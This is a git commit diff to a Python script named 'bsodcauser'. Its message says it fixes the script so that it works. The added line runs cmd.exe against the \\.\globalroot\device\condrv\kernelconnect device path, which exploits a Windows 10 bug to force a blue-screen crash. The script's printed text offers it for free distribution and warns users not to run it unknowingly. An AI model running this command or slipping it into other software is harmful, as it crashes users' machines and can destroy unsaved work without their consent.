94d5d7ce31195ea8d49b0291c35fcac4141a3ca0
Insertx2k <62176660+InsertX2k@users.noreply.github.com>
2021-02-27 16:23:02 +0200

    Fixed the problem where this script doesn't function at all

--- bsodcauser-sourcecode.py
+++ bsodcauser-sourcecode.py
@@ -4,4 +4,4 @@ print("This project or App may be freely distributed within anything for free an
 print("The developer of this project is Insertx2k Dev, using the Windows 10 KernelConnect Bug")
 print("Please note that you SHOULD not run this BSOD trigger when you are not sure what it does to your computer.")
 print("Please wait, Causing a BSOD...")
-os.system('cmd.exe /c "cd \\.\globalroot\device\condrv\kernelconnect"')
+os.system('cmd.exe /c "\\.\globalroot\device\condrv\kernelconnect"')
